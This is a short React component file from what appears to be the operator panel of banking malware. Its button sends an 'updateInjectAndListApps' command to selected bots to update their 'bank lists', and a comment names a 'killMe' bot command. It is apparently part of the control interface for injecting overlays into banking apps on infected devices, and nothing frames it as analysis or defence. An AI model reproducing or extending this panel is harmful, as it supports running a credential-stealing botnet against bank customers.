import React from 'react';
import SettingsContext from '../../Settings';


//{"name":"killMe"}
class UpdateAppLists extends React.Component {

    constructor(props) {
        super(props);
    }

    onClickAppLists = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"updateInjectAndListApps"}');
            SettingsContext.ShowToast("success", "Send message to update apps list");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card">
                <div class="card-body">
                    <h5 class="card-title">Update App Lists</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Update bank lists on selected bots</h6>
                    <button type="button" onClick={this.onClickAppLists} class="btn btn-right btn-outline-warning">Update App Lists</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default UpdateAppLists;